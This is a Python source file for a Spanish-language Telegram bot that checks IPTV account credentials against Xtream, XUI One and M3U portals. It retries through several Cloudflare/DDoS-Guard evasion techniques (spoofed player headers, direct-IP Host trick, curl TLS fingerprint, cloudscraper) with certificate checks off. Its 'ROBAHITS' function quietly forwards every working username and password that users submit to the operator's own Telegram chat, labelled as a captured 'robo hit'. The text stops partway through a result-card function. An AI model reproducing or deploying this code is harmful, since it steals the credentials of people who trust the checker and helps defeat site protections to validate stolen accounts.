#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║        🦂 L U I S  R 🦂  —  IPTV BOT NIVEL DIOS         ║
║              v6.0 FINAL ∞ DEFINITIVO  24/7               ║
║   Xtream · XUI One · M3U · Cloudflare · Todos formatos   ║
╚══════════════════════════════════════════════════════════╝
"""

import os, re, json, time, threading, logging, socket, asyncio
import random, pickle, traceback, subprocess
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import pytz
import requests
from requests.adapters import HTTPAdapter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

requests.packages.urllib3.disable_warnings()

# ╔══════════════════════════════════════════════════════╗
# ║               ⚙️  CONFIGURACIÓN                      ║
# ╚══════════════════════════════════════════════════════╝
BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL      = os.getenv("RENDER_URL", "")
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")
TZ              = pytz.timezone(TZ_NAME)
BOT_USERNAME    = "@Luishits_bot"

if not ROBAHITS_CHATID and ADMIN_ID:
    ROBAHITS_CHATID = str(ADMIN_ID)

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ── Estado global ──────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS          = {"checks":0,"hits":0,"fails":0,"retries":0,"users":set()}

# ── Visual ─────────────────────────────────────────────
L1    = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
L2    = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
SK    = "🦂"
FIRE  = "🔥"; BOLT  = "⚡"; STAR  = "⭐"; DIAM  = "💎"
SHLD  = "🛡️"; GLOB  = "🌐"; KEY   = "🗝️"; CAL   = "📅"
CLK   = "🕐"; SIG   = "📡"; LIV   = "📺"; MOV   = "🎬"
SER   = "🎭"; CHK   = "✅"; CRS   = "❌"; WRN   = "⚠️"
ARR   = "➤"; GEM   = "🔮"; RKT   = "🚀"; TRF   = "🏆"
CRN   = "👑"; LOK   = "🔐"

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

# ── Timeouts ───────────────────────────────────────────
T_CONN  = 8    # conexión
T_READ  = 20   # lectura (subido para servidores lentos)
T_TOTAL = 45   # total por cuenta

# ── User-Agents — VLC primero (más compatible con IPTV) ─
UAS = [
    "VLC/3.0.20 LibVLC/3.0.20",
    "VLC/3.0.21 LibVLC/3.0.21",
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
    "GSE SMART IPTV/7.4 (Android 11)",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "MXPlayer/1.73.6 (Linux; Android 12)",
    "okhttp/4.9.0",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
]

# ── Estados activos que usan los servidores IPTV reales ─
ACTIVE_ST = {
    "active","activo","activa","activated","1","true",
    "enabled","ok","valid","online","alive","running",
    "live","subscribed","premium","vip","yes",
}
# ── Estados inactivos definitivos ─────────────────────
INACTIVE_ST = {
    "expired","banned","disabled","blocked","inactive",
    "suspended","cancelled","trial_expired","0","false","no",
}
# ── Textos en plain-text que significan FAIL ──────────
PLAIN_FAIL = [
    "PLAYLIST_DISABLED","ACCOUNT_EXPIRED","ACCOUNT_BANNED",
    "USER_NOT_FOUND","INVALID_PASS","ACCOUNT_DISABLED",
    "TRIAL_EXPIRED","INVALID_TOKEN","AUTH_FAILED",
]
# ── Textos que indican página CF/protección ───────────
CF_MARKS = [
    "cloudflare","just a moment","checking your browser",
    "enable javascript","ddos-guard","ray id","cf-ray",
    "attention required","recaptcha","challenge-platform",
]

COOKIES_DIR = Path("cf_cookies")
COOKIES_DIR.mkdir(exist_ok=True)
_POOL = ThreadPoolExecutor(max_workers=24)
_UA_IDX = 0
_UA_LOCK = threading.Lock()


# ╔══════════════════════════════════════════════════════╗
# ║                🛠️  UTILIDADES                        ║
# ╚══════════════════════════════════════════════════════╝

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

def next_ua() -> str:
    global _UA_IDX
    with _UA_LOCK:
        ua = UAS[_UA_IDX % len(UAS)]
        _UA_IDX += 1
        return ua

def flag(code: str) -> str:
    f = FLAGS.get(code, "")
    if not f and len(code) == 2:
        pts = [ord(c)+127397 for c in code.upper()]
        f = chr(pts[0])+chr(pts[1])
    return f

def cook_path(host: str) -> Path:
    return COOKIES_DIR / f"{host.split(':')[0].replace('.','_')}.pkl"

def save_cook(s, host: str):
    try:
        with open(cook_path(host),"wb") as f:
            pickle.dump(dict(s.cookies), f)
    except Exception: pass

def load_cook(s, host: str):
    try:
        p = cook_path(host)
        if p.exists() and (time.time()-p.stat().st_mtime) < 7200:
            with open(p,"rb") as f:
                s.cookies.update(pickle.load(f))
    except Exception: pass

def mk_session(host: str = "") -> requests.Session:
    s = requests.Session()
    s.mount("http://",  HTTPAdapter(max_retries=0))
    s.mount("https://", HTTPAdapter(max_retries=0))
    if host: load_cook(s, host)
    s.headers.update({
        "User-Agent":      "VLC/3.0.20 LibVLC/3.0.20",
        "Accept":          "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "close",
    })
    return s

def is_cf_page(text: str) -> bool:
    if not text: return False
    low = text.lower()
    return any(k in low for k in CF_MARKS)


# ╔══════════════════════════════════════════════════════╗
# ║          🔍 EXTRACTOR UNIVERSAL DE URLs              ║
# ║  Soporta: Xtream · XUI One · M3U · pipe · espacio   ║
# ╚══════════════════════════════════════════════════════╝

def extract(text: str):
    """
    Devuelve (portal, user, pwd, is_xui, raw_url)
    raw_url = URL completa si es M3U directo
    """
    text = (text or "").strip()
    text = text.replace("\r","").replace("%3A",":").replace("%2F","/")
    text = re.sub(r"&amp;","&", text)

    # ── XUI One playlist ──────────────────────────────
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
        r'/playlist/([^/\s\n]+)/([^/\s\n?&]+)',
        text, re.I)
    if m:
        portal = m.group(1)
        user   = m.group(2)
        pwd    = m.group(3).split("?")[0].split("&")[0].strip()
        return portal, user, pwd, True, None

    # ── Xtream get.php / player_api ───────────────────
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
        r'/(?:get\.php|player_api\.php)\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        text, re.I)
    if m:
        portal = m.group(1)
        user   = m.group(2)
        pwd    = re.split(r'[&\s\n]', m.group(3))[0].strip()
        return portal, user, pwd, False, None

    # ── live/user/pass ────────────────────────────────
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._\-]+(?::\d+)?)'
        r'/live/([^/\s\n]+)/([^/\s\n?]+)',
        text, re.I)
    if m:
        return m.group(1), m.group(2), m.group(3), False, None

    # ── M3U directo (URL que empieza con http) ────────
    m = re.search(r'(https?://[^\s\n]+\.m3u[^\s\n]*)', text, re.I)
    if m:
        url = m.group(1)
        parsed = urlparse(url)
        portal = parsed.netloc
        qs = dict(re.findall(r'([^&=\s]+)=([^&\s]+)', parsed.query))
        user = qs.get("username","")
        pwd  = qs.get("password","")
        if user and pwd:
            return portal, user, pwd, False, url
        return portal, "m3u", "m3u", False, url

    # ── pipe separado: portal|user|pass ──────────────
    if "|" in text:
        parts = [x.strip() for x in text.split("|")]
        if len(parts) >= 3 and ("." in parts[0] or ":" in parts[0]):
            return parts[0], parts[1], parts[2], False, None

    # ── espacio separado: portal user pass ───────────
    parts = text.split()
    if len(parts) == 3 and ("." in parts[0] or ":" in parts[0]):
        return parts[0], parts[1], parts[2], False, None

    return None, None, None, False, None


# ╔══════════════════════════════════════════════════════╗
# ║           🔬 ANÁLISIS DE RESPUESTA UNIVERSAL         ║
# ╚══════════════════════════════════════════════════════╝

def parse_json_safe(raw: str):
    raw = raw.strip()
    try: return json.loads(raw)
    except Exception: pass
    for ch in ('{','['):
        idx = raw.find(ch)
        if idx >= 0:
            try: return json.loads(raw[idx:])
            except Exception: pass
    return None

def analyze(data) -> tuple:
    """
    Analiza el JSON de respuesta del servidor IPTV.
    Devuelve ("HIT"|"CUSTOM"|"FAIL"|"RETRY", payload)
    """
    if not isinstance(data, dict):
        # Lista JSON → HIT si tiene canales
        if isinstance(data, list) and len(data) > 0:
            return "HIT", {
                "user_info": {"auth":1,"status":"Active","exp_date":"0",
                              "active_cons":"?","max_connections":"?",
                              "is_trial":"0","created_at":"0"},
                "server_info": {}
            }
        return "RETRY", None

    # Buscar user_info en distintas estructuras
    ui = (data.get("user_info")
          or data.get("userInfo")
          or data.get("user")
          or None)

    # Algunos servidores devuelven todo en raíz
    if ui is None:
        if any(k in data for k in ("auth","username","exp_date","max_connections","status")):
            ui = data
        else:
            return "RETRY", None

    # Leer auth — puede ser int, str, bool, o ausente
    auth_raw = ui.get("auth", ui.get("authenticated", ui.get("valid", None)))
    if auth_raw is None:
        # Sin campo auth: si tiene status o exp_date, asumir válido
        if any(k in ui for k in ("status","exp_date","max_connections")):
            auth = 1
        else:
            return "RETRY", None
    else:
        try:
            auth = int(str(auth_raw))
        except Exception:
            auth = 1 if str(auth_raw).lower() in ("true","yes","ok","valid","1") else 0

    if auth == 0:
        return "FAIL", None

    # Auth == 1 → cuenta existe, revisar status
    real_ui = data.get("user_info", ui)
    payload = {
        "user_info":   real_ui,
        "server_info": data.get("server_info", {}),
    }

    status = str(
        real_ui.get("status")
        or real_ui.get("account_status")
        or real_ui.get("state")
        or "active"   # si no hay campo status y auth=1, asumir activo
    ).strip().lower()

    if not status or status in ("none","null",""):
        status = "active"

    if status in ACTIVE_ST:
        return "HIT", payload
    if status in INACTIVE_ST:
        return "CUSTOM", payload

    # Status desconocido con auth=1 → marcar HIT (cuenta responde)
    log.info(f"[analyze] status desconocido '{status}' con auth=1 → HIT")
    return "HIT", payload


def process(r) -> tuple:
    """Procesa una respuesta HTTP y devuelve (status, payload)."""
    if r is None:
        return "RETRY", None

    code = r.status_code

    # 404 = usuario no existe
    if code == 404:
        return "FAIL", None

    # Sin contenido
    if code in (502, 504):
        return "RETRY", None

    try:
        raw = r.text.strip()
    except Exception:
        return "RETRY", None

    if not raw or len(raw) < 4:
        return "RETRY", None

    # Página HTML
    if raw[0] == "<":
        if is_cf_page(raw):
            return "RETRY", None
        # Otro HTML (error de servidor)
        return "RETRY", None

    # Error en texto plano
    UP = raw.upper()
    for k in PLAIN_FAIL:
        if k in UP:
            return "FAIL", None

    # Lista M3U directa → HIT inmediato
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth":1,"status":"Active","exp_date":"0",
                "active_cons":"?","max_connections":"?",
                "is_trial":"0","created_at":"0",
            },
            "server_info": {}, "m3u_direct": True,
        }

    data = parse_json_safe(raw)
    if data is None:
        log.debug(f"[process] No JSON ni M3U: {raw[:80]}")
        return "RETRY", None

    return analyze(data)


# ╔══════════════════════════════════════════════════════╗
# ║          🌐 PETICIÓN HTTP — Una sola URL             ║
# ╚══════════════════════════════════════════════════════╝

def fetch(url: str, host: str, ua: str = None, extra_headers: dict = None) -> tuple:
    """
    Hace GET con:
    - verify=False (SSL desactivado para chequeo)
    - allow_redirects=True (sigue redirecciones)
    - Logging real del error
    """
    try:
        s = mk_session(host)
        if ua:
            s.headers["User-Agent"] = ua
        if extra_headers:
            s.headers.update(extra_headers)
        r = s.get(url,
                  timeout=(T_CONN, T_READ),
                  verify=False,
                  allow_redirects=True)
        save_cook(s, host)
        if r.status_code not in (200, 206):
            log.info(f"[http] {r.status_code} {url[:70]}")
        return process(r)
    except requests.exceptions.ConnectTimeout:
        log.info(f"[http] ConnectTimeout {url[:70]}")
        return "RETRY", None
    except requests.exceptions.ReadTimeout:
        log.info(f"[http] ReadTimeout({T_READ}s) {url[:70]}")
        return "RETRY", None
    except requests.exceptions.SSLError:
        # Reintentar sin verificar (ya es False, puede ser otro problema SSL)
        try:
            import urllib3
            urllib3.disable_warnings()
            s2 = mk_session(host)
            if ua: s2.headers["User-Agent"] = ua
            r2 = s2.get(url, timeout=(T_CONN, T_READ), verify=False,
                        allow_redirects=True)
            return process(r2)
        except Exception:
            return "RETRY", None
    except requests.exceptions.ConnectionError as e:
        log.info(f"[http] ConnError {str(e)[:60]} {url[:50]}")
        return "RETRY", None
    except Exception as e:
        log.info(f"[http] {type(e).__name__}: {str(e)[:60]}")
        return "RETRY", None


# ╔══════════════════════════════════════════════════════╗
# ║      🛡️  BYPASS CF — Solo cuando es necesario        ║
# ║  Técnica 1: headers IPTV variados                   ║
# ║  Técnica 2: IP directa + header Host                ║
# ║  Técnica 3: curl del sistema (TLS fingerprint ≠)    ║
# ║  Técnica 4: cloudscraper (si está instalado)        ║
# ╚══════════════════════════════════════════════════════╝

def _bypass_headers(url: str, host: str) -> tuple:
    """Prueba varios conjuntos de headers IPTV reales."""
    header_sets = [
        {"User-Agent":"VLC/3.0.20 LibVLC/3.0.20","Accept":"*/*",
         "Icy-MetaData":"1","Connection":"close"},
        {"User-Agent":"TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
         "Accept":"*/*","Accept-Encoding":"gzip","Connection":"close"},
        {"User-Agent":"Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
         "Accept":"application/json, text/plain, */*",
         "Accept-Language":"es-419","Accept-Encoding":"gzip, deflate"},
        {"User-Agent":"IPTV Smarters Pro/3.0.9.4 (Android 10)",
         "Accept":"*/*","Connection":"keep-alive"},
    ]
    for hdrs in header_sets:
        try:
            s = requests.Session()
            s.mount("http://",  HTTPAdapter(max_retries=0))
            s.mount("https://", HTTPAdapter(max_retries=0))
            load_cook(s, host)
            r = s.get(url, headers=hdrs, timeout=(T_CONN, T_READ),
                      verify=False, allow_redirects=True)
            save_cook(s, host)
            res, pay = process(r)
            if res != "RETRY":
                log.info(f"[bypass-hdrs] ✅ {hdrs['User-Agent'][:30]}")
                return res, pay
        except Exception:
            pass
    return "RETRY", None

def _bypass_ip(url: str, host: str) -> tuple:
    """Conecta por IP directa para saltar CF en el dominio."""
    domain = host.split(":")[0]
    port   = host.split(":")[1] if ":" in host else "8080"
    try:
        real_ip = socket.gethostbyname(domain)
        if real_ip == domain:
            return "RETRY", None
        url_ip  = url.replace(domain, real_ip, 1)
        hdrs = {
            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
            "Host": domain + (f":{port}" if port not in ("80","443") else ""),
            "Accept": "*/*", "Connection": "close",
        }
        s = requests.Session()
        s.mount("http://",  HTTPAdapter(max_retries=0))
        s.mount("https://", HTTPAdapter(max_retries=0))
        r = s.get(url_ip, headers=hdrs, timeout=(T_CONN, T_READ),
                  verify=False, allow_redirects=False)
        res, pay = process(r)
        if res != "RETRY":
            log.info(f"[bypass-ip] ✅ IP {real_ip}")
            return res, pay
    except Exception as e:
        log.debug(f"[bypass-ip] {e}")
    return "RETRY", None

def _bypass_curl(url: str, host: str) -> tuple:
    """Usa curl del sistema (TLS fingerprint diferente al de Python)."""
    try:
        cmd = [
            "curl","-s","-L","--max-time","18","--insecure",
            "-A","VLC/3.0.20 LibVLC/3.0.20",
            "-H","Accept: */*",
            "-H","Accept-Encoding: gzip, deflate",
            "--compressed", url
        ]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if res.returncode == 0 and res.stdout.strip():
            raw = res.stdout.strip()
            if not is_cf_page(raw):
                class FakeR:
                    status_code = 200
                    text = raw
                log.info(f"[bypass-curl] ✅ {host}")
                return process(FakeR())
    except FileNotFoundError:
        pass
    except Exception as e:
        log.debug(f"[bypass-curl] {e}")
    return "RETRY", None

def _bypass_cloudscraper(url: str, host: str) -> tuple:
    """Usa cloudscraper si está instalado."""
    try:
        import cloudscraper
        sc = cloudscraper.create_scraper(
            browser={"browser":"chrome","platform":"windows","mobile":False},
            delay=2
        )
        load_cook(sc, host)
        r = sc.get(url, timeout=20, verify=False, allow_redirects=True)
        if r.status_code in (200, 206):
            raw = r.text.strip()
            if not is_cf_page(raw):
                save_cook(sc, host)
                log.info(f"[bypass-cs] ✅ {host}")
                return process(r)
    except ImportError:
        pass
    except Exception as e:
        log.debug(f"[bypass-cs] {e}")
    return "RETRY", None

def cf_bypass(url: str, host: str) -> tuple:
    """Motor de bypass — prueba las 4 técnicas en orden."""
    log.info(f"[cf] Bypass para {host}")
    for fn in (_bypass_headers, _bypass_ip, _bypass_curl, _bypass_cloudscraper):
        res, pay = fn(url, host)
        if res != "RETRY":
            return res, pay
    log.warning(f"[cf] Todas las técnicas fallaron para {host}")
    return "RETRY", None


# ╔══════════════════════════════════════════════════════╗
# ║     🚀 VERIFICACIÓN PRINCIPAL — Todos los formatos  ║
# ╚══════════════════════════════════════════════════════╝

def verify(portal: str, user: str, pwd: str,
           is_xui: bool = False, raw_url: str = None) -> tuple:
    """
    Verifica una cuenta IPTV. Soporta todos los formatos:
    - Xtream Codes (get.php + player_api.php)
    - XUI One (playlist/)
    - M3U directo
    - Cloudflare / DDoS-Guard (bypass automático)
    """
    host    = portal.split(":")[0]
    port    = int(portal.split(":")[1]) if ":" in portal else 8080
    t0      = time.time()
    elapsed = lambda: time.time() - t0
    timedout= lambda: elapsed() >= T_TOTAL

    # ── Si es M3U directo, verificar rápido ───────────
    if raw_url:
        res, pay = fetch(raw_url, host)
        if res != "RETRY":
            return res, pay

    # ── Construir todas las URLs a probar ─────────────
    # Determinar esquema por puerto
    if port in (443, 8443, 2053, 2083, 2087, 2096):
        schemes = ["https", "http"]
    else:
        schemes = ["http", "https"]

    urls = []
    for sc in schemes:
        base = f"{sc}://{portal}"
        # player_api primero (da más info de la cuenta)
        urls.append(f"{base}/player_api.php?username={user}&password={pwd}")
        # get.php
        urls.append(f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus")
        # XUI One
        if is_xui:
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u")

    # XUI One siempre (aunque no se haya detectado)
    for sc in schemes:
        base = f"{sc}://{portal}"
        urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
        urls.append(f"{base}/playlist/{user}/{pwd}/m3u")
        # get.php sin type
        urls.append(f"{base}/get.php?username={user}&password={pwd}")

    # Dedup manteniendo orden
    seen, unique = set(), []
    for u in urls:
        if u not in seen:
            seen.add(u); unique.append(u)

    # ── Paso 1: Paralelo ──────────────────────────────
    remaining = T_TOTAL - elapsed()
    futures = {_POOL.submit(fetch, u, host): u for u in unique}
    try:
        for fut in as_completed(futures, timeout=remaining):
            try:
                res, pay = fut.result()
                if res in ("HIT","FAIL","CUSTOM"):
                    for f in futures: f.cancel()
                    log.info(f"[verify] {res} en {elapsed():.1f}s | {futures[fut][:65]}")
                    return res, pay
            except Exception as e:
                log.debug(f"[verify] future: {e}")
    except Exception:
        pass

    # ── Paso 2: Reintentos con UA rotación ────────────
    if not timedout():
        log.info(f"[verify] Reintentando con UA alternativo para {host}")
        for ua in (UAS[1], UAS[2], UAS[3]):
            if timedout(): break
            for sc in schemes[:1]:  # solo http
                base = f"{sc}://{portal}"
                for ep in (
                    f"{base}/player_api.php?username={user}&password={pwd}",
                    f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus",
                    f"{base}/playlist/{user}/{pwd}/m3u_plus",
                ):
                    if timedout(): break
                    res, pay = fetch(ep, host, ua=ua)
                    if res != "RETRY":
                        log.info(f"[verify] {res} con UA {ua[:25]}")
                        return res, pay
                    time.sleep(0.3)

    # ── Paso 3: Bypass CF (siempre, no solo dominios conocidos) ──
    if not timedout():
        log.info(f"[verify] Intentando bypass CF para {host}")
        for sc in schemes:
            if timedout(): break
            for ep in (
                f"{sc}://{portal}/player_api.php?username={user}&password={pwd}",
                f"{sc}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
                f"{sc}://{portal}/playlist/{user}/{pwd}/m3u_plus",
            ):
                if timedout(): break
                res, pay = cf_bypass(ep, host)
                if res != "RETRY":
                    return res, pay

    log.info(f"[verify] RETRY final {host} — {elapsed():.1f}s")
    return "RETRY", None


# ╔══════════════════════════════════════════════════════╗
# ║         📊 CONTEO DE CONTENIDO — Streaming           ║
# ╚══════════════════════════════════════════════════════╝

def _count_stream(url: str, timeout_s: int = 15) -> str:
    try:
        s = mk_session()
        r = s.get(url, timeout=(T_CONN, timeout_s),
                  verify=False, stream=True)
        if r.status_code != 200:
            r.close(); return ""
        depth = count = 0
        in_str = esc = started = False
        read = 0
        for chunk in r.iter_content(65536):
            if not chunk: continue
            read += len(chunk)
            for ch in chunk.decode("utf-8", errors="ignore"):
                if esc:      esc=False; continue
                if ch=="\\" and in_str: esc=True; continue
                if ch=='"':  in_str=not in_str; continue
                if in_str:   continue
                if ch=='[' and not started and depth==0:
                    started=True; continue
                if not started: continue
                if ch=='{':
                    depth+=1
                    if depth==1: count+=1
                elif ch=='}': depth-=1
                elif ch==']' and depth==0:
                    r.close(); return str(count)
            if read >= 25*1024*1024:
                r.close(); return str(count) if count else ""
        r.close()
        return str(count) if count else ""
    except Exception:
        return ""

def get_counts(portal: str, user: str, pwd: str) -> tuple:
    base = f"http://{portal}"
    futs = {
        _POOL.submit(_count_stream,
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",15): "live",
        _POOL.submit(_count_stream,
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_streams",15): "vod",
        _POOL.submit(_count_stream,
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_series",15): "ser",
    }
    res = {}
    try:
        for fut in as_completed(futs, timeout=20):
            try: res[futs[fut]] = fut.result() or "N/D"
            except Exception: pass
    except Exception: pass
    return res.get("live","N/D"), res.get("vod","N/D"), res.get("ser","N/D")

def get_cats(portal: str, user: str, pwd: str, limit: int = 20) -> str:
    try:
        base = f"http://{portal}"
        r = requests.get(
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
            timeout=(T_CONN, 12), verify=False)
        if r.status_code != 200: return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats: return ""
        # Contar canales por categoría
        count_map = {}
        try:
            rc = requests.get(
                f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
                timeout=(T_CONN, 15), verify=False, stream=True)
            if rc.status_code == 200:
                raw = b""
                for chunk in rc.iter_content(65536):
                    raw += chunk
                    if len(raw) > 10*1024*1024: break
                rc.close()
                for ch in json.loads(raw.decode("utf-8","ignore")):
                    cid = str(ch.get("category_id",""))
                    count_map[cid] = count_map.get(cid,0)+1
        except Exception: pass
        lines = []
        for c in cats[:limit]:
            name = c.get("category_name","").replace("\\/","/").strip()
            cid  = str(c.get("category_id",""))
            if not name: continue
            cnt  = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"   {ARR} {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"   ➕ ...y {len(cats)-limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""

def get_location(portal: str) -> str:
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}",
                          timeout=4, verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                code = d.get("countryCode","")
                return f"{d.get('country','?')} {flag(code)}"
    except Exception: pass
    return f"Desconocido {GLOB}"


# ╔══════════════════════════════════════════════════════╗
# ║             🔔 ROBAHITS — Envío automático           ║
# ╚══════════════════════════════════════════════════════╝

def send_roba(portal, user, pwd, ui, live, vod, series, from_user):
    if not BOT_TOKEN or not ROBAHITS_CHATID: return
    try:
        expire = ts_date(ui.get("exp_date",0))
        m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        txt = (
            f"╔{'═'*30}╗\n"
            f"║  {SK} <b>ROBO HIT — 🦂LUIS R🦂</b> {SK}  ║\n"
            f"╚{'═'*30}╝\n\n"
            f"{FIRE} <b>¡CUENTA ACTIVA CAPTURADA!</b> {FIRE}\n\n"
            f"{ARR} {GLOB} <b>Portal:</b> <code>{portal}</code>\n"
            f"{ARR} 👤 <b>Usuario:</b> <code>{user}</code>\n"
            f"{ARR} {KEY} <b>Pass:</b> <code>{pwd}</code>\n"
            f"{ARR} {CAL} <b>Vence:</b> {expire}\n\n"
            f"{LIV} En vivo: <b>{live}</b>  {MOV} VOD: <b>{vod}</b>  {SER} Series: <b>{series}</b>\n\n"
            f'{ARR} 🔗 <a href="{m3u}">📥 Descargar M3U</a>\n\n'
            f"👤 Por: @{from_user}\n"
            f"{CLK} {now_str()}\n"
            f"{SK} {BOT_USERNAME}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id":ROBAHITS_CHATID,"text":txt,
                  "parse_mode":"HTML","disable_web_page_preview":True},
            timeout=10)
    except Exception as e:
        log.warning(f"[roba] {e}")


# ╔══════════════════════════════════════════════════════╗
# ║          🃏 TARJETAS DE RESULTADO                    ║
# ╚══════════════════════════════════════════════════════╝

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire  = ts_date(ui.get("exp_date",0))
    created = ts_date(ui.get("created_at",0))
    active  = ui.get("active_cons","?")
    maxcon  = ui.get("max_connections","?")
    status  = ui.get("status","Active")
    trial   = "❌ No" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Sí"
    loc     = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"

    t  = f"{L1}\n"
    t += f"  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
    t += f"  {DIAM} <b>ᴄᴜᴇɴᴛᴀ ɪᴘᴛᴠ ᴠᴇʀɪꜰɪᴄᴀᴅᴀ</b> {DIAM}\n"
    t += f"{L1}\n\n"
    t += f"  {FIRE} <b>ESTADO:</b> 🟢 <b>{status.upper()} — ACTIVA</b> {FIRE}\n\n"
    t += f"{L2}\n  {GLOB} <b>ACCESO</b>\n{L2}\n"
    t += f"  {ARR} 🌐 Portal: <code>{portal}</code>\n"
    t += f"  {ARR} 👤 Usuario: <code>{user}</code>\n"
    t += f"  {ARR} {KEY} Pass: <code>{pwd}</code>\n"
    t += f"  {ARR} 🧪 Trial: {trial}\n\n"
    t += f"{L2}\n  {CAL} <b>TIEMPO</b>\n{L2}\n"
    t += f"  {ARR} 📅 Creada: {created}\n"
    t += f"  {ARR} ⏳ Vence: <b>{expire}</b>\n"
    t += f"  {ARR} 🔁 Conexiones: {active}/{maxcon}\n"
    t += f"  {ARR} 📍 País: {loc}\n\n"
    t += f"{L2}\n  {LIV} <b>CONTENIDO</b>\n{L2}\n"
    t += f"  {ARR} 📺 En Vivo: <b>{live}</b> canales\n"
    t += f"  {ARR} 🎬 VOD: <b>{vod}</b> películas\n"
    t += f"  {ARR} 🎭 Series: <b>{series}</b> series\n\n"
    t += f"{L2}\n  🔗 <b>LINKS</b>\n{L2}\n"
    t += f'  {ARR} <a href="{m3u}">📥 M3U Plus</a>\n'
    t += f'  {ARR} <a href="{epg}">📋 EPG/Guía</a>\n\n'
    if cats:
        t += f"{L2}\n  📡 <b>CATEGORÍAS EN VIVO</b>\n{L2}\n"
        t += f"{cats}\n\n"
    t += f"{L2}\n"
    t += f"  {CHK} Verificado para @{tg_user}\n"
    t += f"  {CLK} {now_str()}\n"
    t += f"  {SK} {BOT_USERNAME}\n"
    t += f"{L1}"
    return t

def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
    t += f"  {WRN} <b>ᴄᴜᴇɴᴛᴀ ɴᴏ ᴀᴄᴛɪᴠᴀ</b>\n{L1}\n\n"
    t += f"  🟡 <b>EXISTE pero NO ESTÁ ACTIVA</b>\n\n{L2}\n"
    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
    t += f"  {ARR} 👤 <code>{user}</code>\n"
    t += f"  {ARR} 🆙 Estado: {ui.get('status','?').upper()}\n"
    t += f"  {ARR} ⏳ Vence: {ts_date(ui.get('exp_date',0))}\n"
    t += f"  {ARR} 🔁 Máx: {ui.get('max_connections','?')}\n\n{L2}\n"
